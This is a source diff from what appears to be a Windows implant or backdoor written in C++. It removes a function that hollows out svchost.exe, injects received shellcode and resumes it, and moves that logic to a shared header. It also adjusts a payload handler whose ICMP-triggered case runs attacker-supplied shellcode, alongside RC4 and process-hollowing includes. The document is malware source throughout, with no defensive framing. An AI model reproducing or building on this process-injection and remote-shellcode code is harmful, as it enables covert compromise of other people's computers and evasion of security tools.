@@ -21,11 +21,12 @@
 // FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 // DEALINGS IN THE SOFTWARE.
 //
-#include <cstdint>
+#include <stdint.h>
 #include "../shared/debug.h"
 #include "../shared/process_hollowing.h"
 #include "../shared/win32.h"
 #include "../shared/rc4.h"
+#include "../shared/shellcode.h"
 #include "../config.h"
 #include "context.h"
 
@@ -52,21 +53,6 @@ struct payload_data
     uint8_t* data;
     unsigned len;
 };
-
-void shellcode_spawn(uint8_t* shellcode, unsigned len)
-{
-    hollow_process_startup_info info{};
-    info.shellcode_len = len;
-    auto host = GetFolderPath(CSIDL_SYSTEM);
-    host.append("\\svchost.exe");
-    auto pi = hollow_process(shellcode, host.c_str(), &info);
-    if (pi.hThread)
-    {
-        ResumeThread(pi.hThread);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
-}
 
 bool handle_payload(context& ctx, uint8_t* data, unsigned len)
 {
@@ -97,7 +83,7 @@ bool handle_payload(context& ctx, uint8_t* data, unsigned len)
     case icmp_action_shellcode:
     {
         auto* shellcode = data + sizeof(vr_payload);
-        auto shellcode_len = len - sizeof(vr_payload);
+        unsigned shellcode_len = len - sizeof(vr_payload);
         shellcode_spawn(shellcode, shellcode_len);
         break;
     }
